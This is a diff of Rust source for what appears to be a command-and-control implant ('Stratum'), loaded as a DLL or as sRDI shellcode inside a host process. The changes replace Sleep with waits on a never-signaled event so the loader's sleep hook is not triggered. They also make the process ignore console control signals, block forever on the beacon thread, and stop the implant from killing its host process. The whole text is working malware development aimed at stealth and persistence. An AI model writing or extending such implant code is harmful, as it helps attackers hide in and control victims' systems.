@@ -46,6 +46,38 @@ use std::sync::Arc;
 use std::time::Duration;
 use chrono::{Datelike, Timelike};
 
+/// Sleep replacement that avoids kernel32!Sleep — uses WaitForSingleObject on a
+/// never-signaled event instead. Prevents loader sleep-hook interception.
+#[cfg(windows)]
+static SAFE_SLEEP_EVENT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+
+#[cfg(windows)]
+pub fn safe_sleep(dur: Duration) {
+    unsafe {
+        extern "system" {
+            fn CreateEventA(a: *mut std::ffi::c_void, b: i32, c: i32, d: *const u8) -> *mut std::ffi::c_void;
+            fn WaitForSingleObject(h: *mut std::ffi::c_void, ms: u32) -> u32;
+        }
+        let mut h = SAFE_SLEEP_EVENT.load(std::sync::atomic::Ordering::Relaxed);
+        if h == 0 {
+            let evt = CreateEventA(std::ptr::null_mut(), 1, 0, std::ptr::null());
+            if !evt.is_null() {
+                SAFE_SLEEP_EVENT.store(evt as usize, std::sync::atomic::Ordering::Relaxed);
+                h = evt as usize;
+            }
+        }
+        if h != 0 {
+            let ms = dur.as_millis().min(u32::MAX as u128) as u32;
+            WaitForSingleObject(h as *mut std::ffi::c_void, ms);
+        }
+    }
+}
+
+#[cfg(not(windows))]
+pub fn safe_sleep(dur: Duration) {
+    std::thread::sleep(dur);
+}
+
 // ── compile-time constants ────────────────────────────────────────────────────
 
 const WINDOW_START:  &str = env!("STRATUM_WINDOW_START");
@@ -378,10 +410,17 @@ pub unsafe extern "system" fn StratumRun(
         fn CreateEventA(attrs: *mut std::ffi::c_void, manual: i32, initial: i32, name: *const u8) -> *mut std::ffi::c_void;
         fn WaitForSingleObject(handle: *mut std::ffi::c_void, ms: u32) -> u32;
         fn HeapCreate(options: u32, initial_size: usize, max_size: usize) -> *mut std::ffi::c_void;
+        fn SetConsoleCtrlHandler(handler: *const std::ffi::c_void, add: i32) -> i32;
     }
 
     #[cfg(stratum_debug)]
     { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] entered\0".as_ptr()); }
+
+    // Ignore all console control signals (CTRL_C, CTRL_BREAK, CTRL_CLOSE).
+    // The MSVC CRT installs a default handler that calls ExitProcess with
+    // STATUS_CONTROL_C_EXIT (0xC000013A) — fatal when running as sRDI inside
+    // a -mwindows host process without a console.
+    SetConsoleCtrlHandler(std::ptr::null(), 1);
 
     // Create a private heap for all agent TLS allocations.
     // Isolates from the host process heap — prevents heap corruption when
@@ -529,26 +568,16 @@ pub unsafe extern "system" fn StratumRun(
     { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr()); }
     AGENT_THREAD_HANDLE.store(h as usize, std::sync::atomic::Ordering::SeqCst);
 
-    // Create a never-signaled event for keep-alive waits.
-    // WaitForSingleObject is not hooked by the loader's sleep obfuscation (only Sleep is).
-    let wait_event = CreateEventA(std::ptr::null_mut(), 1, 0, std::ptr::null());
-    let mut tick: u32 = 0;
-    loop {
-        if !wait_event.is_null() {
-            WaitForSingleObject(wait_event, 60_000);
-        } else {
-            Sleep(60_000);
-        }
-        tick += 1;
-        // Log every minute so we know StratumRun loop is still alive
-        #[cfg(stratum_debug)]
-        {
-            extern "system" { fn OutputDebugStringA(s: *const u8); }
-            if tick == 1 { OutputDebugStringA(b"[SR] loop tick 1m\0".as_ptr()); }
-            else if tick == 2 { OutputDebugStringA(b"[SR] loop tick 2m\0".as_ptr()); }
-            else if tick == 5 { OutputDebugStringA(b"[SR] loop tick 5m\0".as_ptr()); }
-        }
+    // Wait on the agent thread handle — blocks forever (agent thread never exits
+    // under normal operation). This avoids calling ANY sleep API on the beacon thread,
+    // which would trigger the loader's sleep hook and XOR+NOACCESS the agent memory.
+    if !h.is_null() {
+        extern "system" { fn WaitForSingleObject(h: *mut std::ffi::c_void, ms: u32) -> u32; }
+        WaitForSingleObject(h, 0xFFFFFFFF); // INFINITE
+    } else {
+        loop { safe_sleep(Duration::from_secs(3600)); }
     }
+    0
 }
 
 // regsvr32 /s <dll>
@@ -562,7 +591,10 @@ pub extern "system" fn DllRegisterServer() -> i32 {
 
 #[cfg(windows)]
 fn _exit_if_dll() {
-    unsafe { crate::dynapi::exit_process(0); }
+    // When loaded as DLL or sRDI shellcode, we must NOT kill the host process.
+    // Just return — the caller (agent_loop / run_loop) will unwind naturally.
+    // EXE standalone: main() calls std::process::exit(0) after agent_loop returns.
+    // sRDI: agent_thread_entry returns 0, shellcode sleeps forever to keep host alive.
 }
 
 #[cfg(not(windows))]
